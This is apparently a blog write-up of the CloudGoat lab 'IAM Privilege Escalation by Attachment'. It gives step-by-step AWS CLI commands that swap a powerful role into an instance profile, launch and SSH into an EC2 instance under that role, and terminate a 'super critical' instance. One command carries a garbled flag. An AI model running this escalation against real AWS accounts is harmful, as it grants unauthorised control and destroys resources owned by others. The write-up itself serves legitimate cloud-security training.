---
title:  "CloudGoat: IAM Privilege Escalation by Attachment"
date:   2024-03-25
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-25
---

In this scenaio, they provide us the kerrigan user who can list role, add and remove instance profile role. We will use these permissions to do privilege escalation.

### List instance profiles
```shell
aws --profile kerrigan iam list-instance-profiles
```

Result:
```json
{
    "InstanceProfiles": [
        {
            "InstanceProfileName": "cg-ec2-meek-instance-profile-iam_privesc_by_attachment_###",
            "Arn": "arn:aws:iam::###:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_###",
            "Roles": [
                {

                    "RoleName": "cg-ec2-meek-role-iam_privesc_by_attachment_###",
                    "Arn": "arn:aws:iam::###:role/cg-ec2-meek-role-iam_privesc_by_attachment_###",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
```

We got an instance profile `cg-ec2-meek-instance-profile-iam_privesc_by_attachment_###` with a role `cg-ec2-meek-role-iam_privesc_by_attachment_###` that allow to be assumed by ec2 instances.

### List all roles
```shell
aws --profile kerrigan iam list-roles
```

Result:
```json
{
    "Roles": [
        {
            "RoleName": "cg-ec2-meek-role-iam_privesc_by_attachment_###",
            "Arn": "arn:aws:iam::###:role/cg-ec2-meek-role-iam_privesc_by_attachment_###",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ec2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
        },
        {
            "RoleName": "cg-ec2-mighty-role-iam_privesc_by_attachment_###",
            "Arn": "arn:aws:iam::###:role/cg-ec2-mighty-role-iam_privesc_by_attachment_###",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ec2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
        }
    ]
}
```

There are 2 interesting roles. We knew that our instance profile are using the `cg-ec2-meek-role-iam_privesc_by_attachment_###` role, and we will change the instance profile to use the `cg-ec2-mighty-role-iam_privesc_by_attachment_###` role.

To make the blog shorter, I will assume that we knew the `cg-ec2-meek-role-iam_privesc_by_attachment_###` role doesn't have any permission. You can explore by creating new ec2 instance with the `cg-ec2-meek-instance-profile-iam_privesc_by_attachment_###` instance profile.
{: .notice--info}

### Remove role from instance profile
```shell
aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_### --role-name cg-ec2-meek-role-iam_privesc_by_attachment_###
```

### Attach new role to instance profile
```shell
aws --profile kerrigan iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_### --role-name cg-ec2-mighty-role-iam_privesc_by_attachment_###
```

### Run new instance with modified instance profile
To run new instance, we need key pair to do ssh from our computer to the instance, security groups id for allowing us to ssh with port 22, instance profile arn, and subet ID.

#### Create key pair
```shell
aws --profile kerrigan ec2 create-key-pair --key-name pwned --query 'KeyMaterial' --output text > pwned.pem
```
This command will create key pair with name `pwned` and save private key to file `pwned.pem`

To be able to run ssh with private key `pwned.pem`, you need to change the file permission.
```shell
chmod 400 pwned.pem
```

#### Get security group
```shell
aws --profile kerrigan ec2 describe-security-groups
```

Result:
```json
{
 "SecurityGroups": [
        {
            "Description": "CloudGoat iam_privesc_by_attachment_### Security Group for EC2 Instance over HTTP",
            "GroupName": "cg-ec2-http-iam_privesc_by_attachment_###",
            "GroupId": "<security-group-id>"
        },
        {
            "Description": "CloudGoat iam_privesc_by_attachment_### Security Group for EC2 Instance over SSH",
            "GroupName": "cg-ec2-ssh-iam_privesc_by_attachment_###",
            "GroupId": "<security-group-id>"
        }
    ]
}
```
The scenario already provided us 2 security groups for HTTP and SSH request.

### List subnets
```shell
aws --profile kerrigan ec2 describe-subnets
```

Result:
```json
{
    "Subnets": [
        {
            "SubnetId": "<subnet-id>",
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "CloudGoat iam_privesc_by_attachment_### Public Subnet"
                },
                {
                    "Key": "Stack",
                    "Value": "CloudGoat"
                },
                {
                    "Key": "Scenario",
                    "Value": "iam-privesc-by-attachment"
                }
            ]
        }
    ]
}
```

#### Run EC2 instance
```shell
aws --profile kerrigan ec2 run-instances --image-id ami-0a313d6098716f372 --instance-type t2.micro --iam-instance-profile Arn=arn:aws:iam::###:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_### --key-name pwned --subnet-id <subnet-id> --security-security-group-ids <security-group-id-ssh> <security-group-id-http>
```
This command will create and run new EC2 instance with instance type `t2.micro`, image id `ami-0a313d6098716f372` which is an ubuntu image, and attach key `pwned`.

Result:
```json
{
    "Groups": [],
    "Instances": [
        {
            "ImageId": "ami-0a313d6098716f372",
            "InstanceId": "<instance-id>",
            "InstanceType": "t2.micro",
            "KeyName": "pwned",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::###:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_###"
            }
        }
    ]
}
```
We will get the EC2 instance with `pending` state and doesn't have public ip yet. After the instance is in `running` state, we will get an public ip.

### Get instance detail
```shell
aws --profile kerrigan ec2 describe-instances --instance-id <instance-id>
```

Result:
```json
{
    "Groups": [],
    "Instances": [
        {
            "ImageId": "ami-0a313d6098716f372",
            "InstanceId": "<instance-id>",
            "InstanceType": "t2.micro",
            "KeyName": "pwned",
            "PublicDnsName": "<public-dns-name>",
            "PublicIpAddress": "<public-ip-address>",
            "State": {
                "Code": 16,
                "Name": "running"
            },
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::###:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_###"
            }
        }
    ]
}
```

### Shell to the instance
```shell
ssh -i pwned.pem ubuntu@<public-dns-name-or-public-ip-address>
```
This command will shell to the instance with user `ubuntu` and private key `pwned.pem`

Now, we are in the instance!!!

### See the role
To see the role, we need to install AWS CLI on this instance.

```shell
sudo apt update
```
This command will update the list of avaliable packages

```shell
sudo apt install awscli
```
This command will install AWS CLI on our instance

Now, we can use AWS CLI.

Let's check our role.
```shell
aws sts get-caller-identity
```

Result:
```json
{
    "Arn": "arn:aws:sts::###:assumed-role/cg-ec2-mighty-role-iam_privesc_by_attachment_###/<instance-id>"
}
```

Our instance are on the `cg-ec2-mighty-role-iam_privesc_by_attachment_###` role.

We are god now, you can do whatever you want.

### Terminate another instances
In this scenario, our goal is terminating the super critical instance.

Let's list instances first.
```shell
aws ec2 describe-instances --query 'Reservations[*].Instances[*].InstanceId'
```
`aws ec2 describe-instances` will show all the ec2 instances in our account and `--query` is for querying only the detail that we want, in this case instance id.

Result:
```json
[
    [
        "<super-critical-instance-id>"
    ],
    [
        "<our-new-instance-id>"
    ]
]
```

Let's Terminate the super critical instance
```shell
aws ec2 terminate-instances --instance-ids <target-instance-id>
```

Result:
```json
{
    "TerminatingInstances": [
        {
            "CurrentState": {
                "Code": 32,
                "Name": "shutting-down"
            },
            "InstanceId": "<target-instance-id>",
            "PreviousState": {
                "Code": 16,
                "Name": "running"
            }
        }
    ]
}
```

We succeeded 👾
